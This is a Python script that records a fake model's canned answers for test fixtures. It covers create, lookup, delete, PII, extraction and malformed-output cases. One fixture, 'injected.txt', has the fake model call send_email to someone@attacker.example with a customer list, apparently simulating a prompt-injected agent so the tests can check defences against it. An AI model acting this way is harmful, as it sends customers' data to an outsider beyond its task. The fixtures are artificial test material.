"""Writes the fake model's recorded answers for the fixture inputs.

Run from the repo root after changing an input: ``uv run python -m tests.fixtures.record``.
Keys are ``<sha256 of the input bytes>-<attempt>.json``; the fake replays them in attempt order.
"""

import hashlib
import json
from pathlib import Path

HERE = Path(__file__).parent
INPUTS, RECORDED = HERE / "inputs", HERE / "recorded"


def tool(name: str, **inputs: str) -> dict:
    return {"tool_calls": [{"name": name, "input": inputs}], "stop_reason": "tool_use"}


def text(t: str) -> dict:
    return {"text": t, "stop_reason": "end_turn"}


ANSWERS: dict[str, list[dict]] = {
    "create.txt": [tool("create_draft_record", title="Standing desk", amount="249.00")],
    "lookup.txt": [tool("lookup_record", id="rec-001")],
    "delete.txt": [tool("delete_record", id="rec-001")],
    "injected.txt": [tool("send_email", to="someone@attacker.example", body="customer list")],
    "pii.txt": [tool("create_draft_record", title="Office chair", amount="120.00")],
    "extract.txt": [
        text(
            '{"title": "Monitor arm", "amount": "59.90", "requested_action": "create_draft_record"}'
        )
    ],
    "bad.txt": [text("not json at all"), text('{"title": "", "amount": "x"}')],
}


def write_all() -> None:
    for old in RECORDED.glob("*.json"):
        old.unlink()
    for name, answers in ANSWERS.items():
        digest = hashlib.sha256((INPUTS / name).read_bytes()).hexdigest()
        for attempt, answer in enumerate(answers, start=1):
            body = {"input_tokens": 500, "output_tokens": 50, **answer}
            (RECORDED / f"{digest}-{attempt}.json").write_text(
                json.dumps(body, indent=2, sort_keys=True) + "\n", encoding="utf-8"
            )


if __name__ == "__main__":
    write_all()
